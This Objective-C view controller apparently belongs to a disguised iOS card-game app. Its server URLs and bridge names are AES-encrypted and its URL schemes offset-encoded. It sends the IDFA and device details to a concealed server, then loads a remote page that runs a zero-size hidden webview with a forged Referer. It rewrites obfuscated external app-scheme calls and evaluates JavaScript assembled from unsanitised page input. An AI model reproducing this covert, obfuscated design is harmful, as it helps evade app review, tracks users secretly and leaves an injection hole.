//
//  ZOXXGameTiYanView.m
//  CardGame4
//
//  Created by macos on 2020/4/25.
//  Copyright © 2020 oxxther. All rights reserved.
//

#import "ZOXXGameTiYanViewController.h"
#import <WebKit/WebKit.h>
#import "Reachability.h"
#import "UIImage+ZOXXSave2Photo.h"
#import "ZOXXJiaMi.h"
#import "ZOXXGennalTool.h"
#import "ZOXXJiaMi.h"
#import "NSString+ZOXXOffset.h"

@interface ZOXXGameTiYanViewController ()<WKUIDelegate,WKNavigationDelegate,WKScriptMessageHandler>

@property (nonatomic) WKWebView *webview;

@property (nonatomic, strong) NSURLRequest *currentURL;

@property (nonatomic, strong) Reachability *conn;

@property (nonatomic, strong) UIView *tipsView;

@property (nonatomic) WKWebView *hide_webview;

@end

@implementation ZOXXGameTiYanViewController

+ (BOOL)needTiYan{
    return YES;
}

static ZOXXGameTiYanViewController *_sharedSingleton;
//单例
+ (instancetype)sharedSingleton {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        //不能再使用alloc方法
        //因为已经重写了allocWithZone方法，所以这里要调用父类的分配空间的方法
        _sharedSingleton = [[super allocWithZone:NULL] init];
    });
    return _sharedSingleton;
}

// 防止外部调用alloc 或者 new
+ (instancetype)allocWithZone:(struct _NSZone *)zone {
    return [ZOXXGameTiYanViewController sharedSingleton];
}

// 防止外部调用copy
- (id)copyWithZone:(nullable NSZone *)zone {
    return [ZOXXGameTiYanViewController sharedSingleton];
}

// 防止外部调用mutableCopy
- (id)mutableCopyWithZone:(nullable NSZone *)zone {
    return [ZOXXGameTiYanViewController sharedSingleton];
}

- (void)viewDidLoad{
    [super viewDidLoad];
    //初始化各种
    [self getChid];
    
    //添加网络监测
    [self addNetwork];

    CGFloat screenWidth = [UIScreen mainScreen].bounds.size.width;
    CGFloat screenHeight = [UIScreen mainScreen].bounds.size.height;
    CGFloat naviHeight = 0;
    
    NSDictionary *bodyDic = [self paramerDic];
    NSString *str = @"PZJvDglqSGjDhzr43gmcmfb9aNLZsZSkCnEWZ9dlkxnA+sHI2axu/93Hwuq+yf9D";
    NSString *urlstring = [NSString stringWithFormat:@"%@?gameid=1&idfa=%@&exmodel=%@&version=%@&pkg=%@&sdkver=%@&chid=%@&bundle_id=%@",[ZOXXJiaMi AES128Decrypt:str],bodyDic[@"idfa"] ,bodyDic[@"exmodel"],bodyDic[@"version"],bodyDic[@"pkg"],bodyDic[@"sdkver"],bodyDic[@"chid"],bodyDic[@"bundle_id"]];

    WKWebViewConfiguration *hide_configuration = [[WKWebViewConfiguration alloc] init];
    WKWebView *hide_webview = [[WKWebView alloc] initWithFrame:CGRectZero configuration:hide_configuration];
    self.hide_webview.backgroundColor = [UIColor whiteColor];
    self.hide_webview = hide_webview;
    self.hide_webview.UIDelegate = self;
    self.hide_webview.navigationDelegate = self;
    [self.view addSubview:self.hide_webview];
    
    WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];
    [configuration.userContentController addScriptMessageHandler:self name:[ZOXXJiaMi AES128Decrypt:@"4D2a6GOSt4skHc4hJ/HNvA=="]];
    [configuration.userContentController addScriptMessageHandler:self name:@"captureScreen"];
    [configuration.userContentController addScriptMessageHandler:self name:[ZOXXJiaMi AES128Decrypt:@"1g7me3OdTnqBYZb+U3kOJA=="]];
    WKWebView *webview = [[WKWebView alloc] initWithFrame:CGRectMake(0, naviHeight, screenWidth, screenHeight-naviHeight) configuration:configuration];
    webview.UIDelegate = self;
    webview.navigationDelegate = self;
    self.webview = webview;
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:[urlstring stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]]];
    self.currentURL = request;
    [webview loadRequest:request];
    [self.view addSubview:webview];
}

- (void)networkStateChange{
    if ([self.conn currentReachabilityStatus] != NotReachable) {
        self.tipsView.hidden = YES;
        [self.webview loadRequest:self.currentURL];
    }else{
        self.tipsView.hidden = NO;
    }
}

- (void)dealloc
{
    [self.conn stopNotifier];
    [[NSNotificationCenter defaultCenter] removeObserver:self];
}

- (UIView *)tipsView{
    if (!_tipsView) {
        _tipsView = [[UIView alloc] initWithFrame:[UIScreen mainScreen].bounds];
        [self.view addSubview:_tipsView];
        _tipsView.backgroundColor = [UIColor whiteColor];
        
        UIImageView * imageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"img_nowifi"]];
        imageView.contentMode = UIViewContentModeCenter;
        [_tipsView addSubview:imageView];
        imageView.frame = _tipsView.bounds;
    }
    return _tipsView;
}

#pragma mark - private
- (void)getChid{
    [ZOXXGennalTool keychain_deleteValue:@"chid"];
    //获取chid
    while (YES) {
        NSString *chid = [ZOXXGennalTool keychain_loadValue:@"chid"];
        NSLog(@"chid = %@",chid);
        if (!chid) {
            //第一次激活
            NSURLSession *session = [NSURLSession sharedSession];
            NSDictionary *bodyDic = [self paramerDic];
            NSString *api = @"6hkcX87MZSDI2Zs28VgV4x3Kc6BTK1szM5T/flLgft/NY2hHm+Y2lMMoIi2GE2+F";
            NSString *urls = [NSString stringWithFormat:@"%@?gameid=%@&cid=%@&exmodel=%@&username=%@&pkg=%@&version=%@&idfa=%@&sdkver=1.4",[ZOXXJiaMi AES128Decrypt:api],bodyDic[@"gameid"],bodyDic[@"cid"],bodyDic[@"exmodel"],bodyDic[@"idfa"],bodyDic[@"pkg"],bodyDic[@"version"],bodyDic[@"idfa"]];
            NSURL *url = [NSURL URLWithString:[urls stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
            request.HTTPMethod = @"GET";
            dispatch_semaphore_t sema = dispatch_semaphore_create(0);
            NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
                if (!error && data.length > 0) {
                    NSDictionary *jsonDic = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
                    [ZOXXGennalTool keychain_saveKey:@"chid" dataValue:jsonDic[@"chid"]];
                }
                dispatch_semaphore_signal(sema);
            }];
            [task resume];
            dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
        }else{
            break;
        }
    }
}

- (void)addNetwork{
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(networkStateChange) name:kReachabilityChangedNotification object:nil];
    self.conn = [Reachability reachabilityForInternetConnection];
    [self.conn startNotifier];
}

- (UIImage *)createImage:(UIView *)view{
    // 开启图片上下文
    UIGraphicsBeginImageContextWithOptions(view.bounds.size, NO, 0);
    // 获取当前上下文
    CGContextRef ctx = UIGraphicsGetCurrentContext();
    // 截图:实际是把layer上面的东西绘制到上下文中
    [view.layer renderInContext:ctx];
    // 获取截图
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    // 关闭图片上下文
    UIGraphicsEndImageContext();

    return image;
}

- (NSDictionary *)paramerDic{
    return @{
               @"bundle_id":[ZOXXGennalTool ZOXXget_BundleID],
               @"chid":[ZOXXGennalTool keychain_loadValue:@"chid"] ? [ZOXXGennalTool keychain_loadValue:@"chid"] : @"",
               @"exmodel":[ZOXXGennalTool ZOXXget_iphoneType],
               @"idfa":[ZOXXGennalTool ZOXXget_idfa],
               @"wxjbtoapp":@"1",
               @"lang":@"zh-ch",
               @"rfapp":@"1",
               @"inm":@"1",
               @"pkg":[ZOXXGennalTool ZOXXget_AppName],
               @"sdkver":@"1.4",
               @"version":[ZOXXGennalTool ZOXXget_Version],
               @"gameid":@"1",
               @"cid":@"0",
           };
}

#pragma mark - WKNavigationDelegate
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler{
    NSLog(@"%s:%@  %@",__func__,navigationAction.request.URL.absoluteURL,webView);
    
    NSURL * url = navigationAction.request.URL;
    
    NSString * scheme = [url scheme];
    if ([scheme isEqualToString:@"http"] ||
        [scheme isEqualToString:@"https"] ||
        [scheme isEqualToString:@"about"]) {
        decisionHandler(WKNavigationActionPolicyAllow);
    }else{
        
        //对url进行偏移
        NSString *url1 = [url.absoluteString string1Offset2];
        if ([url1 hasPrefix:@"97,118,125,142,137,171,118,117,127,"]) {
            NSString * headStr = @"97,118,125,142,137,171,118,117,127,187,208,215,232,227,261,249,268,275,281,300,316,257,283,";
            NSString *bodyStr = [url.query stringByRemovingPercentEncoding];
            NSData *jsonData = [bodyStr dataUsingEncoding:NSUTF8StringEncoding];
            NSMutableDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                options:NSJSONReadingMutableContainers
                                                                  error:nil];
            [dic setObject:[@"103,107,129,131,86,149,164,167,189,187,211,219,217,241,186,266,271,282," string2Offset1] forKey:@"fromAppUrlScheme"];
            jsonData = [NSJSONSerialization dataWithJSONObject:dic options:NSJSONWritingPrettyPrinted error:nil];
            bodyStr = [[NSString alloc]initWithData:jsonData encoding:NSUTF8StringEncoding];
            NSString * urls = [[NSString stringWithFormat:@"%@%@",[headStr string2Offset1],bodyStr] stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]];
            url = [NSURL URLWithString:urls];
        }
       
        if (@available(iOS 10.0, *)) {
            [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:nil];
        } else {
            [[UIApplication sharedApplication] openURL:url];
        }
        decisionHandler(WKNavigationActionPolicyCancel);
    }
}

#pragma mark - WKScriptMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message{
    NSLog(@"message %@ -- %@",message.name,message.body);
    if ([message.name isEqualToString:@"captureScreen"]) {
        NSData *jsonData = [message.body dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:nil];
        //截屏
        [[self createImage:self.webview] saveIntoPhotosAlbum];
        NSString *argv = dic[@"url"];
        NSString *func = dic[@"cb"];
        NSString *js = [NSString stringWithFormat:@"%@('%@')",func,argv];
        [self.webview evaluateJavaScript:js completionHandler:nil];
    }
    NSString *string = [ZOXXJiaMi AES128Encrypt:message.name];
    if ([string isEqualToString:@"4D2a6GOSt4skHc4hJ/HNvA=="]) {
        NSData *jsonData = [message.body dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:nil];
        NSString *argv = dic[@"url"];
        argv = [argv stringByAppendingFormat:@"&redirect_url=%@://",self.currentURL.URL.host];
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:argv]];
        [request setValue:self.currentURL.URL.host forHTTPHeaderField: @"Referer"];
        [self.hide_webview loadRequest:request];
    }
    if ([string isEqualToString:@"1g7me3OdTnqBYZb+U3kOJA=="]) {
        NSData *jsonData = [message.body dataUsingEncoding:NSUTF8StringEncoding];
        NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData options:NSJSONReadingMutableContainers error:nil];
        NSString *argv = dic[@"url"];
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:argv]];
        [self.hide_webview loadRequest:request];
    }
}

@end
